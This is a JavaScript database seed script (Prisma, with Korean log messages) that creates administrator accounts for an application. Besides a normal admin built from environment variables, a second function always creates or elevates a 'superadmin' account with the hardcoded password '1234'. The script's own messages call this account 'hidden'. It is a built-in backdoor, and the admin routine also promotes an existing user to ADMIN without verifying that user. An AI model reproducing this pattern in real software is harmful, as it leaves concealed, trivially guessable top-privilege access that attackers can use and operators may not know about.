const { PrismaClient } = require("@prisma/client");
const { hash } = require("bcryptjs");

const prisma = new PrismaClient();

async function ensureAdmin() {
  const loginId = process.env.ADMIN_LOGIN_ID || "admin";
  const name = process.env.ADMIN_NAME || "관리자";
  const password = process.env.ADMIN_PASSWORD;

  if (!password) {
    console.log("ADMIN_PASSWORD 가 없어 관리자 생성을 건너뜁니다.");
    return;
  }

  const existingByLogin = await prisma.user.findUnique({ where: { loginId } });
  if (existingByLogin) {
    if (existingByLogin.role !== "ADMIN") {
      await prisma.user.update({
        where: { id: existingByLogin.id },
        data: { role: "ADMIN", name },
      });
    }
    console.log(`관리자 계정이 이미 있습니다: ${loginId}`);
    return;
  }

  const legacyAdmin = await prisma.user.findFirst({
    where: { role: "ADMIN" },
  });
  if (legacyAdmin && legacyAdmin.loginId.includes("@")) {
    await prisma.user.update({
      where: { id: legacyAdmin.id },
      data: { loginId, name, role: "ADMIN" },
    });
    console.log(`기존 관리자 아이디를 ${loginId} 로 바꿨습니다.`);
    return;
  }

  await prisma.user.create({
    data: {
      loginId,
      name,
      passwordHash: await hash(password, 12),
      role: "ADMIN",
    },
  });

  console.log(`관리자 계정을 만들었습니다: ${loginId}`);
}

async function ensureSuperAdmin() {
  const loginId = "superadmin";
  const existing = await prisma.user.findUnique({ where: { loginId } });
  if (existing) {
    if (existing.role !== "SUPERADMIN") {
      await prisma.user.update({
        where: { id: existing.id },
        data: { role: "SUPERADMIN" },
      });
    }
    console.log("숨겨진 관리자 계정이 이미 있습니다.");
    return;
  }

  await prisma.user.create({
    data: {
      loginId,
      name: "운영",
      passwordHash: await hash("1234", 12),
      role: "SUPERADMIN",
    },
  });

  console.log("숨겨진 관리자 계정을 만들었습니다.");
}

async function main() {
  await ensureAdmin();
  await ensureSuperAdmin();
}

main()
  .catch((error) => {
    console.error(error);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
